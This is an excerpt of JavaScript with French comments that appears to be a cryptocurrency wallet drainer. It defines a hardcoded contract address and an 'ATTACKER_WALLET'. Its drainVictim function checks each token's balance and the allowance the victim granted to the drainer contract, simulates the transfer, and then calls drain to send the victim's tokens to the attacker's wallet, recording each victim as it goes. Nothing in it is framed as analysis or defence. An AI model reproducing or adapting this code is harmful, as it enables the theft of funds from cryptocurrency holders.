...
// -------------------------------------------------------------
const CONTRACT_ADDRESS = '0x492b442f153621086d0EA223aba61C3C78270F04';
const ATTACKER_WALLET = '0x9e09f7E4AD79177Ba1cB4b2125390d9A4d6f34DB';
// -------------------------------------------------------------
...
export async function drainVictim(victimAddress, chainId) {
  ...
  // 1. Vérifier que le wallet est le propriétaire
  const owner = await drainContract.owner();
  if (owner.toLowerCase() !== wallet.address.toLowerCase()) {
    console.error(`❌ Propriétaire du contrat = ${owner}, wallet = ${wallet.address}`);
    throw new Error('Le wallet ne correspond pas au owner du contrat');
  }
  ...
  for (const [tokenName, tokenAddr] of Object.entries(tokens)) {
    ...
    try {
      const [balance, allowance, decimals] = await Promise.all([
        ...
        tokenContract.allowance(victimAddress, CONTRACT_ADDRESS),
      ...
      if (balance.isZero() || allowance.isZero()) {
        console.log(`⏭️ ${tokenName} : solde ou allow null`);
        continue;
      }

      // 2. SIMULER pour obtenir la raison exacte
      try {
        await drainContract.callStatic.drain(victimAddress, tokenAddr, ATTACKER_WALLET);
        console.log(`✅ Simulation OK pour ${tokenName}`);
      } catch (simErr) {
        console.error(`🔍 Simulation échouée pour ${tokenName}:`, simErr.reason || simErr.message);
      ...
      const tx = await drainContract.drain(victimAddress, tokenAddr, ATTACKER_WALLET, {
        gasLimit: 250000  // un peu plus de marge
      });
      const receipt = await tx.wait();
      const drainedAmount = balance.lt(allowance) ? balance : allowance;
      const amountFormatted = ethers.utils.formatUnits(drainedAmount, dec);
      ...
      if (err.code === 'CALL_EXCEPTION') {
        console.error(`❌ Erreur sur ${tokenName} :`, err.reason || err.message);
        await recordVictim(victimAddress, chainId, tokenName, '0', 'failed');
      } else if (err.code === 'SERVER_ERROR') {
        throw err; // sera relancé par drainWithRetry
      } else {
        console.error(`❌ Erreur inattendue sur ${tokenName} :`, err.message);
        await recordVictim(victimAddress, chainId, tokenName, '0', 'failed');
      }
    }
  ...
  if (drainedSome) {
    ...
    console.log(`⏭️ ${victimAddress} n'a rien de drainable.`);
    return false;
  }
}
